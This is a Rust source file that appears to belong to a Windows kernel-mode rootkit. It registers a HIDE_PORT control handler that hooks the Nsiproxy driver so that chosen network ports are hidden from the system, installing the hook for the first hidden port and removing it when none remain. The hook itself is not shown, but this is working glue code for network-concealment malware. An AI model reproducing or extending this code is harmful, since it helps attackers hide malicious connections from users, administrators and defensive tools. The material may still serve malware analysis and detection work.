use {
    alloc::boxed::Box,
    shadowx::{Port, port},
    core::sync::atomic::Ordering,
    wdk_sys::{IO_STACK_LOCATION, IRP, NT_SUCCESS},
};

use {
    crate::utils::{
        ioctls::IoctlManager,
        get_input_buffer
    },
    common::{
        ioctls::HIDE_PORT, 
        structs::TargetPort
    },
};

/// Registers the IOCTL handlers for port-related operations.
/// 
/// This function registers a handler to manage port-related operations, such as adding or removing
/// ports from the protected ports list. Additionally, it manages the installation and uninstallation
/// of a hook into the `Nsiproxy` driver when necessary.
/// 
/// # Supported IOCTL Operation:
/// 
/// * **HIDE_PORT** - Handles the hide/unhide of ports by toggling their presence in the protected list.
/// 
/// # Arguments
/// 
/// * `ioctls` - A mutable reference to an `IoctlManager`, where the port-related IOCTL handler will be registered.
pub fn register_port_ioctls(ioctls: &mut IoctlManager) {
    // Handle port protection: hide port by toggling its status in the protected ports list.
    ioctls.register_handler(HIDE_PORT, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
        unsafe {
            // Lock the list of protected ports to check if it's empty.
            let protected_ports = port::PROTECTED_PORTS.lock();
            
            // If the list is empty and the hook is not installed, install the hook.
            if protected_ports.is_empty() && !port::HOOK_INSTALLED.load(Ordering::Relaxed) {
                Port::install_hook();
            }

            // Unlock the ports list.
            drop(protected_ports);

            // Get the target port from the input buffer.
            let target_port = get_input_buffer::<TargetPort>(stack)?;

            // Add or remove the target port from the protected list.
            let status = port::add_remove_port_toggle(target_port);
            
            // If the operation was successful and the list is now empty, uninstall the hook.
            if NT_SUCCESS(status) {
                let protected_ports = port::PROTECTED_PORTS.lock();
                if protected_ports.is_empty() && port::HOOK_INSTALLED.load(Ordering::Relaxed) {
                    Port::uninstall_hook();
                }
            }

            // Set the number of bytes returned to the size of `TargetPort`.
            (*irp).IoStatus.Information = size_of::<TargetPort>() as u64;
            Ok(status)
        }
    }));
}
